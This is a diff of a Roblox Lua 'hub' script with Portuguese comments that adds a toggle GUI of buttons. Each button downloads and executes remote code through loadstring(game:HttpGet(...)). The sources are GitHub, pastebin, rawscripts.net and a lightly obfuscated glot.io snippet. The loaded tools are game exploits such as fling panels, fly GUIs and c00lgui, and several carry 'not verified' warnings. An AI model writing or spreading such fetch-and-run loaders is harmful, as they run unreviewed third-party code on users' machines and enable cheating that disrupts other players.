@@ -1,4 +1,100 @@
-local player = game.Players.LocalPlayer
+-- ID da imagem
+local imageId = "rbxassetid://12869420933"
+
+-- Serviços
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- GUI principal
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "DavidHub"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = playerGui
+
+-- Botão do ícone (toggle)
+local toggleButton = Instance.new("ImageButton")
+toggleButton.Name = "ToggleButton"
+toggleButton.Image = imageId
+toggleButton.Size = UDim2.new(0, 60, 0, 60)
+toggleButton.Position = UDim2.new(0, 10, 0.5, -30)
+toggleButton.BackgroundTransparency = 1
+toggleButton.Parent = screenGui
+
+-- Frame do Hub
+local hubFrame = Instance.new("Frame")
+hubFrame.Name = "HubFrame"
+hubFrame.Size = UDim2.new(0, 250, 0, 300)
+hubFrame.Position = UDim2.new(0, 80, 0.5, -150)
+hubFrame.BackgroundColor3 = Color3.fromRGB(218, 134, 122)
+hubFrame.BackgroundTransparency = 0.2
+hubFrame.BorderSizePixel = 0
+hubFrame.Visible = false
+hubFrame.Parent = screenGui
+
+-- Título do Hub
+local title = Instance.new("TextLabel")
+title.Text = "davidgui hub"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 20
+title.TextColor3 = Color3.new(242, 243, 243)
+title.BackgroundTransparency = 1
+title.Size = UDim2.new(1, 0, 0, 40)
+title.Parent = hubFrame
+
+-- Exemplo de botão dentro do Hub
+local actionButton = Instance.new("TextButton")
+actionButton.Text = "rochips painel"
+actionButton.Font = Enum.Font.Gotham
+actionButton.TextSize = 18
+actionButton.TextColor3 = Color3.new(1, 1, 1)
+actionButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+actionButton.Size = UDim2.new(0.8, 0, 0, 40)
+actionButton.Position = UDim2.new(0.1, 0, 0, 60)
+actionButton.Parent = hubFrame
+
+-- Ação do botão do hub (pode mudar)
+actionButton.MouseButton1Click:Connect(function()
+    if "you wanna use rochips universal" then
+ local z_x,z_z="gzrux646yj/raw/main.ts","https://glot.io/snippets/"
+ local im,lonely,z_c=task.wait,game,loadstring
+ z_c(lonely:HttpGet(z_z..""..z_x))()
+ return ("This will load in about 2 - 30 seconds" or "according to your device and executor")
+end
+    -- Aqui você pode executar outro script, função, etc.
+end)
+
+-- Exemplo de botão dentro do Hub
+local actionButton = Instance.new("TextButton")
+actionButton.Text = "painel fling"
+actionButton.Font = Enum.Font.Gotham
+actionButton.TextSize = 18
+actionButton.TextColor3 = Color3.new(1, 1, 1)
+actionButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+actionButton.Size = UDim2.new(0.8, 0, 0, 40)
+actionButton.Position = UDim2.new(0.1, 0, 0, 90)
+actionButton.Parent = hubFrame
+
+-- Ação do botão do hub (pode mudar)
+actionButton.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/thuker-evader/Roblox/refs/heads/main/c00lkid%20gui"))()
+    -- Aqui você pode executar outro script, função, etc.
+end)
+
+-- Exemplo de botão dentro do Hub
+local actionButton = Instance.new("TextButton")
+actionButton.Text = "david hub v8"
+actionButton.Font = Enum.Font.Gotham
+actionButton.TextSize = 18
+actionButton.TextColor3 = Color3.new(1, 1, 1)
+actionButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+actionButton.Size = UDim2.new(0.8, 0, 0, 40)
+actionButton.Position = UDim2.new(0.1, 0, 0, 120)
+actionButton.Parent = hubFrame
+
+-- Ação do botão do hub (pode mudar)
+actionButton.MouseButton1Click:Connect(function()
+    local player = game.Players.LocalPlayer
 repeat wait() until player:FindFirstChild("PlayerGui")
 
 local gui = Instance.new("ScreenGui", player.PlayerGui)
@@ -262,3 +358,161 @@ table.insert(abas["Horror"], easterEgg)
 -- Ativar aba "Fun" novamente ao final
 for _, b in pairs(abas["Fun"]) do b.Visible = true end
 debugMSG("🔥 HUB COMPLETO! Parte 4 ativa!", 180)
+    -- Aqui você pode executar outro script, função, etc.
+end)
+
+-- Exemplo de botão dentro do Hub
+local actionButton = Instance.new("TextButton")
+actionButton.Text = "r6/r15 changer"
+actionButton.Font = Enum.Font.Gotham
+actionButton.TextSize = 18
+actionButton.TextColor3 = Color3.new(1, 1, 1)
+actionButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+actionButton.Size = UDim2.new(0.8, 0, 0, 40)
+actionButton.Position = UDim2.new(0.1, 0, 0, 150)
+actionButton.Parent = hubFrame
+
+-- Ação do botão do hub (pode mudar)
+actionButton.MouseButton1Click:Connect(function()
+    -- Made by Izekai
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local R6 = Instance.new("TextButton")
+local TextButton = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+R6.Name = "R6"
+R6.Parent = ScreenGui
+R6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+R6.Position = UDim2.new(-0.000343383319, 0, 0.32815966, 0)
+R6.Size = UDim2.new(0, 29, 0, 29)
+R6.Font = Enum.Font.SourceSans
+R6.Text = "R6"
+R6.TextColor3 = Color3.fromRGB(0, 0, 0)
+R6.TextSize = 14.000
+R6.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(('https://pastebin.com/raw/jHGVauVX'),true))()
+end)
+
+TextButton.Parent = ScreenGui
+TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.Position = UDim2.new(0, 0, 0.414634138, 0)
+TextButton.Size = UDim2.new(0, 72, 0, 27)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "Respawn"
+TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextSize = 14.000
+TextButton.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(('https://pastebin.com/raw/ukFZuXbb'),true))()
+end)
+    -- Aqui você pode executar outro script, função, etc.
+end)
+
+-- Exemplo de botão dentro do Hub
+local actionButton = Instance.new("TextButton")
+actionButton.Text = "ghost hub"
+actionButton.Font = Enum.Font.Gotham
+actionButton.TextSize = 18
+actionButton.TextColor3 = Color3.new(1, 1, 1)
+actionButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+actionButton.Size = UDim2.new(0.8, 0, 0, 40)
+actionButton.Position = UDim2.new(0.1, 0, 0, 170)
+actionButton.Parent = hubFrame
+
+-- Ação do botão do hub (pode mudar)
+actionButton.MouseButton1Click:Connect(function()
+    --[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()
+    -- Aqui você pode executar outro script, função, etc.
+end)
+
+-- Exemplo de botão dentro do Hub
+local actionButton = Instance.new("TextButton")
+actionButton.Text = "fly gui"
+actionButton.Font = Enum.Font.Gotham
+actionButton.TextSize = 18
+actionButton.TextColor3 = Color3.new(1, 1, 1)
+actionButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+actionButton.Size = UDim2.new(0.8, 0, 0, 40)
+actionButton.Position = UDim2.new(0.1, 0, 0, 200)
+actionButton.Parent = hubFrame
+
+-- Ação do botão do hub (pode mudar)
+actionButton.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
+
+    -- Aqui você pode executar outro script, função, etc.
+end)
+
+-- Exemplo de botão dentro do Hub
+local actionButton = Instance.new("TextButton")
+actionButton.Text = "system broken"
+actionButton.Font = Enum.Font.Gotham
+actionButton.TextSize = 18
+actionButton.TextColor3 = Color3.new(1, 1, 1)
+actionButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+actionButton.Size = UDim2.new(0.8, 0, 0, 40)
+actionButton.Position = UDim2.new(0.1, 0, 0, 250)
+actionButton.Parent = hubFrame
+
+-- Ação do botão do hub (pode mudar)
+actionButton.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Ragdoll-Engine-BEST-SCRIPT-WORKING-SystemBroken-7544"))()
+
+    -- Aqui você pode executar outro script, função, etc.
+end)
+
+-- Exemplo de botão dentro do Hub
+local actionButton = Instance.new("TextButton")
+actionButton.Text = "c00lgui reborn"
+actionButton.Font = Enum.Font.Gotham
+actionButton.TextSize = 18
+actionButton.TextColor3 = Color3.new(1, 1, 1)
+actionButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+actionButton.Size = UDim2.new(0.8, 0, 0, 40)
+actionButton.Position = UDim2.new(0.1, 200, 0, 30)
+actionButton.Parent = hubFrame
+
+-- Ação do botão do hub (pode mudar)
+actionButton.MouseButton1Click:Connect(function()
+    --[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MiRw3b/c00lgui-v3rx/main/c00lguiv3rx.lua"))()
+    -- Aqui você pode executar outro script, função, etc.
+end)
+
+-- Exemplo de botão dentro do Hub
+local actionButton = Instance.new("TextButton")
+actionButton.Text = "c00lguiv1"
+actionButton.Font = Enum.Font.Gotham
+actionButton.TextSize = 18
+actionButton.TextColor3 = Color3.new(1, 1, 1)
+actionButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+actionButton.Size = UDim2.new(0.8, 0, 0, 40)
+actionButton.Position = UDim2.new(0.1, 200, 0, 0)
+actionButton.Parent = hubFrame
+
+-- Ação do botão do hub (pode mudar)
+actionButton.MouseButton1Click:Connect(function()
+    --[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+loadstring(game:HttpGet("https://raw.githubusercontent.com/cfsmi2/c00lguiv1/refs/heads/main/Main.lua", true))()
+    -- Aqui você pode executar outro script, função, etc.
+end)
+
+-- Sistema Toggle do botão principal
+local hubAberto = false
+toggleButton.MouseButton1Click:Connect(function()
+    hubAberto = not hubAberto
+    hubFrame.Visible = hubAberto
+end) 
